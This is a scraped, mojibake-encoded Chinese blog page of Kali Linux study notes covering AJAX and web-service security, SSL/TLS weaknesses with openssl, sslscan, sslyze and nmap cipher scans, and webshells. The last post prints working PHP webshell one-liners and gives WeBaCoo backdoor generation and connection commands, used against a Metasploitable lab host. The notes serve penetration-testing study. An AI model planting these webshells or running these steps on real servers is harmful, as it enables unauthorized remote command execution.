<li>å¤šä¸ªå¼‚æ­¥è¯·æ±‚ç‹¬ç«‹é€šä¿¡ï¼Œäº’ä¸ä¾èµ–</li>
<li>AJAXæ¡†æ¶<ul>
<li>JQuery</li>
<li>Dojo Toolkit</li>
<li>Google web toolkitï¼ˆGWTï¼‰</li>
<li>Microsoft AJAX library</li>
</ul>
</li>
</ul>
<blockquote>
<pre><code>â­è¯·æ±‚è¿‡ç¨‹ï¼šUser Interface â†’(JavaScript)â†’ AJAX Engine â†’(HTTP Request)â†’ Web Server â†’ Database,backend server
â­å“åº”è¿‡ç¨‹ï¼šDatabse,backend server â†’ Web Server â†’(HTML\JSON\XML)â†’ AJAX Engine â†’(DHTML)â†’ User Interface</code></pre></blockquote>
<h4 id="4-AJAXçš„å®‰å…¨é—®é¢˜"><a href="#4-AJAXçš„å®‰å…¨é—®é¢˜" class="headerlink" title="4. AJAXçš„å®‰å…¨é—®é¢˜"></a>4. AJAXçš„å®‰å…¨é—®é¢˜</h4><ul>
<li>ç›®å‰æ²¡æœ‰é€šç”¨çš„AJAXå®‰å…¨æœ€ä½³å®è·µï¼Œå…¶æ”»å‡»é¢ä¸ä¸ºå¤§å¤šæ•°äººæ‰€çŸ¥</li>
<li>AJAXçš„å®‰å…¨é—®é¢˜<ul>
<li>å¤šç§æŠ€æœ¯æ··åˆï¼Œå¢åŠ äº†æ”»å‡»é¢ï¼Œæ¯ä¸ªå‚æ•°éƒ½å¯èƒ½å½¢æˆç‹¬ç«‹çš„æ”»å‡»è¿‡ç¨‹</li>
<li>AJAXå¼•æ“æ˜¯ä¸ªå…¨åŠŸèƒ½çš„è„šæœ¬è§£é‡Šå™¨ï¼Œè®¿é—®æ¶æ„ç«™ç‚¹å¯èƒ½åæœä¸¥é‡ï¼Œè™½ç„¶æµè§ˆå™¨æœ‰æ²™ç®±å’ŒSOPï¼ˆåŒæºç­–ç•¥ï¼‰ï¼Œä½†å¯èƒ½ç»•è¿‡</li>
<li>æœåŠ¡å™¨ã€å®¢æˆ·ç«¯ä»£ç ç»“åˆä½¿ç”¨äº§ç”Ÿæ··ä¹±ï¼ŒæœåŠ¡å™¨è®¿é—®æ§åˆ¶ä¸å½“ï¼Œå°†ä¿¡æ¯æ³„éœ²ã€</li>
<li>æš´æ¼åº”ç”¨ç¨‹åºé€»è¾‘</li>
</ul>
</li>
<li>AJAXå¯¹æ¸—é€æµ‹è¯•çš„æŒ‘æˆ˜<ul>
<li>å¼‚æ­¥è¯·æ±‚æ•°é‡å¤šä¸”éšè”½</li>
<li>è§¦å‘AJAXè¯·æ±‚çš„æ¡ä»¶æ— è§„å¾‹</li>
<li>æ‰‹åŠ¨å’Œæˆªæ–­ä»£ç†çˆ¬ç½‘å¯èƒ½äº§ç”Ÿå¤§é‡é—æ¼</li>
</ul>
</li>
<li>AJAXçˆ¬ç½‘å·¥å…·<ul>
<li>ZAPï¼ˆSites â†’ å³é”® â†’ Attack â†’ AJAX Spiderï¼‰</li>
</ul>
</li>
<li>å®¢æˆ·ç«¯ä»£ç å®¡è®¡<ul>
<li>æºç </li>
<li>Firebug</li>
</ul>
</li>
</ul>
<h4 id="5-Web-Serviceï¼ˆF12ï¼‰"><a href="#5-Web-Serviceï¼ˆF12ï¼‰" class="headerlink" title="5. Web Serviceï¼ˆF12ï¼‰"></a>5. Web Serviceï¼ˆF12ï¼‰</h4><ul>
<li>Web Service<ul>
<li>é¢å‘æœåŠ¡çš„æ¶æ„ï¼ˆservice oriented architectureï¼‰ä¾¿äºä¸åŒç³»ç»Ÿé›†æˆå…±äº«æ•°æ®å’ŒåŠŸèƒ½</li>
<li>å°¤å…¶é€‚åˆä¸æƒ³è¦æš´æ¼æ•°æ®æ¨¡å‹å’Œç¨‹åºé€»è¾‘è€Œè®¿é—®æ•°æ®çš„åœºæ™¯</li>
<li>æ— é¡µé¢ï¼ˆæœ€å…¸å‹çš„ç±»å‹ï¼‰</li>
</ul>
</li>
<li>ä¸¤ç§ç±»å‹çš„Web Service<ul>
<li>Simple object access protocolï¼ˆSOAPï¼‰<ul>
<li>ä¼ ç»Ÿçš„Web Serviceå¼€å‘æ–¹æ³•ï¼Œxmlæ˜¯å”¯ä¸€çš„æ•°æ®äº¤æ¢æ ¼å¼</li>
<li>è¦æ±‚å®‰å…¨æ€§çš„åº”ç”¨æ›´å¤šé‡‡ç”¨</li>
</ul>
</li>
<li>RESTfulï¼ˆRepresentational Transfer architectureâ€“RESTï¼‰<ul>
<li>ç›®å‰æ›´å¤šè¢«é‡‡ç”¨çš„è½»é‡çš„web serviceï¼ŒJSONæ˜¯é¦–é€‰æ•°æ®äº¤æ¢æ ¼å¼</li>
</ul>
</li>
</ul>
</li>
<li>Web Serviceå®‰å…¨è€ƒè™‘<ul>
<li>ä½¿ç”¨API Keyæˆ–session tokenå®ç°å’Œè·Ÿè¸ªèº«ä»½è®¤è¯</li>
<li>èº«ä»½è®¤è¯ç”±æœåŠ¡å™¨å®Œæˆï¼Œè€Œéå®¢æˆ·ç«¯</li>
<li>API Keyã€ç”¨æˆ·åã€Session tokenæ°¸è¿œä¸è¦é€šè¿‡URLå‘é€</li>
<li>RESTfulé»˜è®¤ä¸æä¾›ä»»ä½•å®‰å…¨æœºåˆ¶ï¼Œéœ€è¦ä½¿ç”¨SSL/TLSä¿æŠ¤ä¼ è¾“æ•°æ®å®‰å…¨</li>
<li>SOAPæä¾›å¼ºäºHTTPSçš„WS-securityæœºåˆ¶ï¼ˆä¼ è¾“å±‚å®ç°ï¼‰</li>
<li>ä½¿ç”¨OAuthæˆ–HMACè¿›è¡Œèº«ä»½éªŒè¯ï¼ŒHMACèº«ä»½è®¤è¯ä½¿ç”¨C/Så…±äº«çš„å¯†é’¥åŠ å¯†API KEY</li>
<li>RESTfulåº”åªå…è®¸èº«ä»½è®¤è¯ç”¨æˆ·ä½¿ç”¨PUTã€DELETEæ–¹æ³•</li>
<li>ä½¿ç”¨éšæœºtokené˜²æ­¢CSRFæ”»å‡»</li>
<li>å¯¹ç”¨æˆ·æäº¤å‚æ•°è¿‡æ»¤ï¼Œå»ºè®®å¸ƒç½²åŸºäºä¸¥æ ¼ç™½åå•çš„æ–¹æ³•</li>
<li>æŠ¥é”™ä¿¡æ¯æ¶ˆæ¯’</li>
<li>ç›´æ¥å¯¹è±¡å¼•ç”¨åº”ä¸¥æ ¼èº«ä»½éªŒè¯ï¼ˆç”µå•†å…¬å¸ä»¥IDä½œä¸ºä¸»ç´¢å¼•ï¼‰</li>
</ul>
</li>
</ul>

          
        
      
    </div>
    
    
    

    

    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
      

  

  
  
  

  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2020/01/22/Kali%20Linux%E7%AC%94%E8%AE%B0(%E4%BA%94%E5%8D%81%E4%BA%94)%EF%BC%9AHttps%E6%94%BB%E5%87%BB/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="Tomas">
      <meta itemprop="description" content="">
      <meta itemprop="image" content="/images/photo.jpg">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Tomas'Blog">
    </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
                
                <a class="post-title-link" href="/2020/01/22/Kali%20Linux%E7%AC%94%E8%AE%B0(%E4%BA%94%E5%8D%81%E4%BA%94)%EF%BC%9AHttps%E6%94%BB%E5%87%BB/" itemprop="url">Kali Linuxç¬”è®°(äº”åäº”)ï¼šHttpsæ”»å‡»</a></h1>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">å‘è¡¨äº</span>
              
              <time title="åˆ›å»ºäº" itemprop="dateCreated datePublished" datetime="2020-01-22T23:54:59+08:00">
                2020-01-22
              </time>
            

            

            
          </span>

          
            <span class="post-category" >
            
              <span class="post-meta-divider">|</span>
            
              <span class="post-meta-item-icon">
                <i class="fa fa-folder-o"></i>
              </span>
              
                <span class="post-meta-item-text">åˆ†ç±»äº</span>
              
              
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/Kali/" itemprop="url" rel="index">
                    <span itemprop="name">Kali</span>
                  </a>
                </span>

                
                
              
            </span>
          

          
            
          

          
          

          

          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <hr>
<h4 id="1-HTTPSæ”»å‡»"><a href="#1-HTTPSæ”»å‡»" class="headerlink" title="1. HTTPSæ”»å‡»"></a>1. HTTPSæ”»å‡»</h4><ul>
<li>å…¨ç«™HTTPSæ­£æˆä¸ºæ½®æµè¶‹åŠ¿<ul>
<li>æ·˜å®ã€ç™¾åº¦</li>
</ul>
</li>
<li>HTTPSçš„ä½œç”¨<ul>
<li>CIA</li>
<li>è§£å†³çš„æ˜¯ä¿¡æ¯ä¼ è¾“è¿‡ç¨‹ä¸­æ•°æ®è¢«ç¯¡æ”¹ã€çªƒå–</li>
<li>åŠ å¯†ï¼šå¯¹ç§°ã€éå¯¹ç§°ã€å•å‘(hashè®¡ç®—)</li>
</ul>
</li>
</ul>
<blockquote>
<pre><code>â­CIA
Cï¼šæœºå¯†æ€§ï¼ˆConfidentialityï¼‰æŒ‡åªæœ‰æˆæƒç”¨æˆ·å¯ä»¥è·å–ä¿¡æ¯ã€‚
Iï¼šå®Œæ•´æ€§ï¼ˆIntegrityï¼‰æŒ‡ä¿¡æ¯åœ¨è¾“å…¥å’Œä¼ è¾“çš„è¿‡ç¨‹ä¸­ï¼Œä¸è¢«éæ³•æˆæƒä¿®æ”¹å’Œç ´åï¼Œä¿è¯æ•°æ®çš„ä¸€è‡´æ€§ã€‚
Aï¼šå¯ç”¨æ€§ï¼ˆAvailabilityï¼‰æŒ‡ä¿è¯åˆæ³•ç”¨æˆ·å¯¹ä¿¡æ¯å’Œèµ„æºçš„ä½¿ç”¨ä¸ä¼šè¢«ä¸æ­£å½“åœ°æ‹’ç»ã€‚</code></pre></blockquote>
<ul>
<li>HTTPSæ”»å‡»æ–¹æ³•<ul>
<li>é™çº§æ”»å‡»ï¼ˆé«˜å¼ºåº¦åŠ å¯†ç®—æ³•çš„é™çº§æ”»å‡»ï¼‰</li>
<li>è§£å¯†æ”»å‡»ï¼ˆæ˜æ–‡ã€è¯ä¹¦ä¼ªé€ ï¼‰</li>
<li>åè®®æ¼æ´ã€å®ç°æ–¹æ³•çš„æ¼æ´ã€é…ç½®ä¸ä¸¥æ ¼</li>
</ul>
</li>
</ul>
<h4 id="2-Secure-socket-layer"><a href="#2-Secure-socket-layer" class="headerlink" title="2. Secure socket layer"></a>2. Secure socket layer</h4><ul>
<li>ä¿è¯ç½‘ç»œé€šä¿¡å®‰å…¨çš„åŠ å¯†åè®®</li>
<li>1994å¹´ç”±Netscapeå¼€å‘æˆä¸ºç»Ÿä¸€æ ‡å‡†</li>
<li>1999å¹´TLSï¼ˆtransport layer securityï¼‰å–ä»£SSL v3</li>
<li>è¿‘å¹´æ¥å‘ç°çš„SSLåè®®æ¼æ´ä½¿ä¸šç•Œè®¤ä¸ºå…¶æ¼æ´å·²ä¸å¯è½¯ä»¶ä¿®å¤<ul>
<li>Heartbleed</li>
<li>POODLE</li>
<li>BEAST</li>
</ul>
</li>
<li>TLSå½“å‰æœ€æ–°ç‰ˆæœ¬1.2</li>
<li>TLS/SSLã€HTTPSã€HTTP over SSLé€šä¿—ä¸Šè¡¨ç¤ºåŒæ„å«ä¹‰</li>
<li>SSL/TLSä¹Ÿè¢«ç”¨äºå…¶ä»–åœºæ™¯çš„ä¼ è¾“é€šé“åŠ å¯†<ul>
<li>é‚®ä»¶ä¼ è¾“ï¼ˆæœåŠ¡å™¨é—´ã€å®¢æˆ·ç«¯ä¸æœåŠ¡æœŸé—´,SMTP/POP3ä¸ºæ˜æ–‡åè®®ï¼‰</li>
<li>æ•°æ®åº“æœåŠ¡å™¨é—´</li>
<li>LDAPèº«ä»½è®¤è¯æœåŠ¡å™¨</li>
<li>SSL VPN</li>
<li>è¿œç¨‹æ¡Œé¢RDPé€šä¿¡è¿‡ç¨‹ä¸­çš„åŠ å¯†å’Œèº«ä»½è®¤è¯</li>
</ul>
</li>
</ul>
<h4 id="3-SSLåŠ å¯†"><a href="#3-SSLåŠ å¯†" class="headerlink" title="3. SSLåŠ å¯†"></a>3. SSLåŠ å¯†</h4><ul>
<li>WEBé€šä¿¡ä¸­çš„SSLåŠ å¯†ï¼ˆPKIä½“ç³»æ¶æ„ï¼‰<ul>
<li>å…¬é’¥è¯ä¹¦ï¼ˆå—ä¿¡ä»»çš„ç¬¬ä¸‰æ–¹è¯ä¹¦é¢å‘æœºæ„ç­¾åé¢å‘ï¼‰</li>
<li>VeriSign</li>
<li>Thawte</li>
<li>GlobalSign</li>
<li>Symantec</li>
</ul>
</li>
<li>åŠ å¯†è¿‡ç¨‹<ul>
<li>æ¡æ‰‹ã€åå•†åŠ å¯†ç®—æ³•ã€è·å–å…¬é’¥è¯ä¹¦ã€éªŒè¯å…¬é’¥è¯ä¹¦ã€äº¤æ¢ä¼šè¯å¯†é’¥ã€åŠ å¯†ä¿¡æ¯ä¼ è¾“</li>
<li>åŠ å¯†å¥—ä»¶ï¼ˆCipher Suiteï¼šå¯¹ç§°åŠ å¯†+éå¯¹ç§°åŠ å¯†+å•å‘åŠ å¯†+å¯†é’¥ç®—æ³•ï¼‰</li>
</ul>
</li>
</ul>
<blockquote>
<pre><code>â­åŠ å¯†ä¿¡æ¯ä¼ è¾“è¿‡ç¨‹ï¼ˆå“ˆå¸Œå€¼ç”¨äºæ•°æ®ä¼ è¾“çš„å®Œæ•´æ€§ï¼‰
1.ç”¨äº¤æ¢çš„å¯¹ç§°å¯†é’¥å¯¹æ˜æ–‡è¿›è¡ŒåŠ å¯†
2.å¯¹åŠ å¯†çš„æ˜æ–‡è¿›è¡Œå“ˆå¸Œè®¡ç®—ï¼Œå¾—å‡ºä¸€ä¸²é¢å¤–çš„å­—ç¬¦ä¸²
3.å¯¹å­—ç¬¦ä¸²è¿›è¡ŒæœåŠ¡å™¨ç§é’¥åŠ å¯†
â–² å­˜åœ¨ç–‘é—®4.åŠ å¯†è¿‡ç¨‹ä¸­ï¼Œå°†å¯¹ç§°å¯†ç åŠ å¯†çš„æ˜æ–‡+å“ˆå¸Œå€¼+åŠ å¯†åçš„å“ˆå¸Œå€¼ä¸€èµ·ä¼ ç»™å¯¹æ–¹
â­åŠ å¯†ä¿¡æ¯è§£å¯†è¿‡ç¨‹
1.ç”¨æœåŠ¡å™¨å…¬é’¥å¯¹å“ˆå¸Œå€¼è¿›è¡Œè§£å¯†ï¼Œå¾—å‡ºå“ˆå¸Œå€¼H2
2.ç”¨äº¤æ¢çš„å¯¹ç§°å¯†é’¥å¯¹å¯¹ç§°å¯†é’¥åŠ å¯†çš„å­—æ®µè¿›è¡Œè§£å¯†ï¼Œå¹¶è®¡ç®—å“ˆå¸Œå€¼H1
3.æ¯”å¯¹å“ˆå¸Œå€¼H1å’ŒH2çš„å€¼æ˜¯å¦ç›¸ç­‰ï¼Œä¿è¯äº†æ•°æ®çš„å®Œæ•´æ€§å’Œèº«ä»½è®¤è¯</code></pre></blockquote>
<h4 id="4-åŠ å¯†ç®—æ³•"><a href="#4-åŠ å¯†ç®—æ³•" class="headerlink" title="4. åŠ å¯†ç®—æ³•"></a>4. åŠ å¯†ç®—æ³•</h4><ul>
<li>éå¯¹ç§°åŠ å¯†ç®—æ³•<ul>
<li>Diffie-Hellman Key exchangeï¼ˆå¯†é’¥äº¤æ¢ï¼‰</li>
<li>Rivest Shamir Adlemanï¼ˆRSAï¼‰</li>
<li>Elliptic Curve Cryptographyï¼ˆECCï¼‰</li>
</ul>
</li>
<li>å¯¹ç§°åŠ å¯†ç®—æ³•<ul>
<li>Data Encryption Standardï¼ˆDES/3DESï¼‰</li>
<li>Advance Encryption Standardï¼ˆAESï¼‰</li>
<li>International Data Encryption Algorithmï¼ˆIDEAï¼‰</li>
<li>Rivest Cipher 4ï¼ˆRC4ï¼‰<ul>
<li>WEPã€TLS/SSLã€RDPã€Secure shell</li>
</ul>
</li>
</ul>
</li>
<li>å•å‘åŠ å¯†ç®—æ³•ï¼ˆhashç®—æ³•ï¼‰<ul>
<li>SHA-3å·²ç»è®¾è®¡å®Œæˆï¼Œä½†å°šæœªå¹¿æ³›ä½¿ç”¨</li>
<li>SHA-2æ˜¯TLS1.2å”¯ä¸€æ”¯æŒçš„å•å‘åŠ å¯†ç®—æ³•</li>
<li>ç¢°æ’æ”»å‡»é’ˆå¯¹å•å‘åŠ å¯†ç®—æ³•<ul>
<li>ä¸¤ä¸ªä¸åŒçš„æ–‡ä»¶ç”Ÿæˆç›¸åŒçš„HASHå€¼</li>
</ul>
</li>
</ul>
</li>
</ul>
<table>
<thead>
<tr>
<th align="center">HASHç®—æ³•</th>
<th align="center">HASHå€¼é•¿åº¦ï¼ˆbitï¼‰</th>
</tr>
</thead>
<tbody><tr>
<td align="center">MD5</td>
<td align="center">128</td>
</tr>
<tr>
<td align="center">SHA-1</td>
<td align="center">160</td>
</tr>
<tr>
<td align="center">SHA-2</td>
<td align="center">224ã€256ã€384ã€512</td>
</tr>
</tbody></table>
<h4 id="5-SSLçš„å¼±ç‚¹"><a href="#5-SSLçš„å¼±ç‚¹" class="headerlink" title="5. SSLçš„å¼±ç‚¹"></a>5. SSLçš„å¼±ç‚¹</h4><ul>
<li>SSLæ˜¯ä¸åŒçš„å¯¹ç§°ã€éå¯¹ç§°ã€å•å‘åŠ å¯†ç®—æ³•çš„ç»„åˆåŠ å¯†å®ç°ï¼ˆcipher suiteï¼‰</li>
</ul>
<table>
<thead>
<tr>
<th align="center">åŠ å¯†ç®—æ³•</th>
<th align="center">SSLå®ç°ä¸­çš„ç”¨é€”</th>
</tr>
</thead>
<tbody><tr>
<td align="center">RAS/Diffie-Hellman</td>
<td align="center">å¯†é’¥äº¤æ¢ã€èº«ä»½è®¤è¯</td>
</tr>
<tr>
<td align="center">AES</td>
<td align="center">åŠ å¯†æ•°æ®ï¼Œç”±RAS/DHå®Œæˆå¯†é’¥äº¤æ¢</td>
</tr>
<tr>
<td align="center">HMAC-SHA2</td>
<td align="center">æ‘˜è¦ä¿¡æ¯</td>
</tr>
</tbody></table>
<ul>
<li>æœåŠ¡å™¨ç«¯ä¸ºæä¾›æ›´å¥½çš„å…¼å®¹æ€§ï¼Œé€‰æ‹©æ”¯æŒå¤§é‡è¿‡æ—¶çš„cipher suite</li>
<li>åå•†è¿‡ç¨‹ä¸­å¼ºè¿«é™çº§åŠ å¯†å¼ºåº¦</li>
<li>ç°ä»£å¤„ç†å™¨è®¡ç®—èƒ½åŠ›å¯ä»¥åœ¨å¯æ¥å—çš„æ—¶é—´å†…ç ´è§£æ—¶åŠ å¯†ç®—æ³•</li>
<li>è´­ä¹°äº‘è®¡ç®—èµ„æºç ´è§£</li>
</ul>
<h4 id="6-Openssl"><a href="#6-Openssl" class="headerlink" title="6. Openssl"></a>6. Openssl</h4><ul>
<li>ç›´æ¥è°ƒç”¨opensslåº“è¯†åˆ«ç›®æ ‡æœåŠ¡å™¨æ”¯æŒçš„SSL/TLS cipher suite</li>
<li><strong><code>ğŸ”ºå‘½ä»¤ï¼šopenssl s_client -connect www.baidu.com:443</code></strong></li>
<li><strong><code>ğŸ”ºå‘½ä»¤ï¼šopenssl s_client -tls1_2 -cipher &#39;ECDH-RSA-RC4-SHA&#39; -connect www.taobao.com:443</code></strong> â–² 2020.1.22 SSL routines:SSL_CTX_set_cipher_list:no cipher match<ul>
<li>â–² å¯†é’¥äº¤æ¢â€“èº«ä»½è®¤è¯â€“æ•°æ®åŠ å¯†â€“HASHç®—æ³•</li>
</ul>
</li>
<li><strong><code>ğŸ”ºå‘½ä»¤ï¼šopenssl s_client -tls1_2 -cipher &quot;NULL,EXPORT,LOW,DES&quot; -connect www.taobao.com:443</code></strong>ï¼ˆåå•†ä½å®‰å…¨çº§åˆ«cipher suiteï¼‰</li>
<li>å¯è¢«ç ´è§£çš„cipher suite<ul>
<li><strong><code>ğŸ”ºå‘½ä»¤ï¼šopenssl ciphers -v &quot;NULL,EXPORT,LOW,DES&quot;</code></strong></li>
</ul>
</li>
<li><a href="https://www.openssl.org/docs/apps/ciphers.html" target="_blank" rel="noopener">https://www.openssl.org/docs/apps/ciphers.html</a> ï¼ˆcipher suiteçš„ç»„åˆï¼‰</li>
<li>Openssléœ€è¦å¤§é‡çš„å¯†ç å­¦ç›¸å…³çŸ¥è¯†ï¼Œå‘½ä»¤å¤æ‚ï¼Œç»“æœå¯è¯»æ€§å·®</li>
</ul>
<h4 id="7-SSLScan"><a href="#7-SSLScan" class="headerlink" title="7. SSLScan"></a>7. SSLScan</h4><ul>
<li>è‡ªåŠ¨è¯†åˆ«SSLé…ç½®é”™è¯¯ã€è¿‡æœŸåè®®ã€è¿‡æ—¶cipher suiteå’Œhashç®—æ³•</li>
<li>é»˜è®¤ä¼šæ£€æŸ¥æ–°æµªCRIMEã€heartbleedæ¼æ´</li>
<li>TLSæ”¯æŒçš„cipher suite<ul>
<li><strong><code>ğŸ”ºå‘½ä»¤ï¼šsslscan --tlsall www.taobao.com:443</code></strong></li>
</ul>
</li>
<li>åˆ†æè¯ä¹¦è¯¦ç»†æ•°æ®<ul>
<li><strong><code>ğŸ”ºå‘½ä»¤ï¼šsslscan --show-certificate --no-ciphersuites www.taobao.com:443</code></strong></li>
</ul>
</li>
</ul>
<h4 id="8-SSLyze"><a href="#8-SSLyze" class="headerlink" title="8. SSLyze"></a>8. SSLyze</h4><ul>
<li>Pythonè¯­è¨€ç¼–å†™</li>
<li>æ£€æŸ¥SSLè¿‡æ—¶ç‰ˆæœ¬</li>
<li>æ£€æŸ¥å­˜åœ¨å¼±ç‚¹çš„cipher suite</li>
<li>æ‰«æå¤šç«™ç‚¹æ—¶ï¼Œæ”¯æŒæ¥æºæ–‡ä»¶</li>
<li>æ£€æŸ¥æ˜¯å¦æ”¯æŒä¼šè¯æ¢å¤</li>
<li><strong><code>ğŸ”ºå‘½ä»¤ï¼šsslyze --regular www.baidu.com:443</code></strong></li>
</ul>
<h4 id="9-Nmap"><a href="#9-Nmap" class="headerlink" title="9. Nmap"></a>9. Nmap</h4><ul>
<li><strong><code>ğŸ”ºå‘½ä»¤ï¼šnmap --script=ssl-enum-ciphers.nse www.taobao.com</code></strong></li>
</ul>
<h4 id="10-QUALYS-SSL-LABS"><a href="#10-QUALYS-SSL-LABS" class="headerlink" title="10. QUALYS SSL LABS"></a>10. QUALYS SSL LABS</h4><ul>
<li><a href="https://www.sslabs.com/ssltest/" target="_blank" rel="noopener">https://www.sslabs.com/ssltest/</a></li>
</ul>

          
        
      
    </div>
    
    
    

    

    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
      

  

  
  
  

  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2020/01/21/Kali%20Linux%E7%AC%94%E8%AE%B0(%E4%BA%94%E5%8D%81%E5%9B%9B)%EF%BC%9AWebShell/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="Tomas">
      <meta itemprop="description" content="">
      <meta itemprop="image" content="/images/photo.jpg">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Tomas'Blog">
    </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
                
                <a class="post-title-link" href="/2020/01/21/Kali%20Linux%E7%AC%94%E8%AE%B0(%E4%BA%94%E5%8D%81%E5%9B%9B)%EF%BC%9AWebShell/" itemprop="url">Kali Linuxç¬”è®°(äº”åå››)ï¼šWebShell</a></h1>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">å‘è¡¨äº</span>
              
              <time title="åˆ›å»ºäº" itemprop="dateCreated datePublished" datetime="2020-01-21T20:40:16+08:00">
                2020-01-21
              </time>
            

            

            
          </span>

          
            <span class="post-category" >
            
              <span class="post-meta-divider">|</span>
            
              <span class="post-meta-item-icon">
                <i class="fa fa-folder-o"></i>
              </span>
              
                <span class="post-meta-item-text">åˆ†ç±»äº</span>
              
              
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/Kali/" itemprop="url" rel="index">
                    <span itemprop="name">Kali</span>
                  </a>
                </span>

                
                
              
            </span>
          

          
            
          

          
          

          

          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <hr>
<h4 id="1-WEBSHELLâ€“æµè§ˆå™¨"><a href="#1-WEBSHELLâ€“æµè§ˆå™¨" class="headerlink" title="1. WEBSHELLâ€“æµè§ˆå™¨"></a>1. WEBSHELLâ€“æµè§ˆå™¨</h4><ul>
<li>Shell<ul>
<li>sshç™»é™†åˆ°metasploitable</li>
<li><strong><code>ğŸ”ºå‘½ä»¤ï¼švi a.php</code></strong></li>
<li><code>&lt;?php echo shell_exec($_GET[&#39;cmd&#39;]);?&gt;</code></li>
<li><strong><code>ğŸ”ºå‘½ä»¤ï¼šcp a.php /var/www</code></strong></li>
<li>æµè§ˆå™¨è®¿é—®a.php</li>
</ul>
</li>
</ul>
<h4 id="2-WEBSHELLâ€“ä¸­å›½èœåˆ€-â–²-2020-1-21æš‚æœªä½¿ç”¨"><a href="#2-WEBSHELLâ€“ä¸­å›½èœåˆ€-â–²-2020-1-21æš‚æœªä½¿ç”¨" class="headerlink" title="2. WEBSHELLâ€“ä¸­å›½èœåˆ€ â–² 2020.1.21æš‚æœªä½¿ç”¨"></a>2. WEBSHELLâ€“ä¸­å›½èœåˆ€ â–² 2020.1.21æš‚æœªä½¿ç”¨</h4><ul>
<li>ä¸­å›½èœåˆ€ï¼š<a href="http://www.maicaidao.co/ï¼ˆä½¿ç”¨unicodeç¼–ç ï¼‰" target="_blank" rel="noopener">http://www.maicaidao.co/ï¼ˆä½¿ç”¨unicodeç¼–ç ï¼‰</a><ul>
<li>å°†ä»£ç æ–°å»ºåˆ°é¶æœºä¸Šcaidao.php</li>
<li><code>&lt;?php @eval(_POST[&#39;chopper&#39;]);?&gt;</code></li>
<li><strong><code>ğŸ”ºå‘½ä»¤ï¼šcp caidao.php /var/www</code></strong></li>
<li>èœåˆ€æœåŠ¡ç«¯æ·»åŠ caidao.phpçš„URLï¼Œè¿›è¡Œé…ç½®ï¼Œè¾“å…¥å¯†ç ï¼Œæ‰§è¡Œ</li>
</ul>
</li>
<li>WebShellå¯èƒ½è¢«IDSã€AVã€WAFã€æ‰«æå™¨è½¯ä»¶å‘ç°æŸ¥æ€</li>
</ul>
<h4 id="3-WEBSHELLâ€“WeBaCooï¼ˆPHPï¼‰"><a href="#3-WEBSHELLâ€“WeBaCooï¼ˆPHPï¼‰" class="headerlink" title="3. WEBSHELLâ€“WeBaCooï¼ˆPHPï¼‰"></a>3. WEBSHELLâ€“WeBaCooï¼ˆPHPï¼‰</h4><ul>
<li>WeBaCooï¼ˆWeb Backdoor Cookieï¼‰<ul>
<li>ç±»ç»ˆç«¯çš„shell</li>
<li>ç¼–ç é€šä¿¡å†…å®¹é€šè¿‡cookieå¤´ä¼ è¾“ï¼Œéšè”½æ€§è¾ƒå¼º</li>
<li>cmï¼šbase64ç¼–ç çš„å‘½ä»¤</li>
<li>cnï¼šæœåŠ¡å™¨ç”¨äºæ•°æ®çš„cookieå¤´çš„åï¼ˆé»˜è®¤å€¼ï¼‰</li>
<li>cpï¼šè¿”å›ä¿¡æ¯å®šç•Œç¬¦ï¼ˆå˜åŒ–çš„å®šç•Œç¬¦ï¼‰</li>
<li>ç”ŸæˆæœåŠ¡ç«¯</li>
</ul>
</li>
<li>ç”ŸæˆæœåŠ¡ç«¯<ul>
<li><strong><code>ğŸ”ºå‘½ä»¤ï¼šwebacoo -g -o webacoo.php</code></strong></li>
</ul>
</li>
<li>æ‹·è´webacoo.phpåˆ°æœåŠ¡å™¨ç«¯<ul>
<li><strong><code>ğŸ”ºå‘½ä»¤ï¼šscp webacoo.php msfadmin@192.168.1.115:/home/msfadmin</code></strong></li>
<li>sshç™»é™†åˆ°metasploitable</li>
<li><strong><code>ğŸ”ºå‘½ä»¤ï¼šcp webacoo.php /var/www</code></strong></li>
</ul>
</li>
<li>å®¢æˆ·ç«¯è¿æ¥<ul>
<li><strong><code>ğŸ”ºå‘½ä»¤ï¼šwebacoo -t -u &quot;http://1.1.1.1/webacoo.php&quot;</code></strong></li>
</ul>
</li>
<li>è¿æ¥æˆåŠŸä¼šå‡ºç°å‘½ä»¤æç¤ºç¬¦</li>
<li>æŠ“åŒ…æŸ¥çœ‹cookie</li>
<li>å…¶ä»–å‚æ•°<ul>
<li>-g ç”ŸæˆæœåŠ¡å™¨ç«¯ä»£ç </li>
<li>-f æ·»åŠ æ‰§è¡Œphpæ“ä½œç³»ç»Ÿå‡½æ•°</li>
<li>-r è¿”å›ä¸è¿›è¡Œæ··æ·†çš„ä»£ç </li>
<li>-t è¿œç¨‹å»ºç«‹terminal</li>
<li>-u webacoo URL</li>
<li>-e å•å‘½ä»¤æ‰§è¡Œæ¨¡å¼</li>
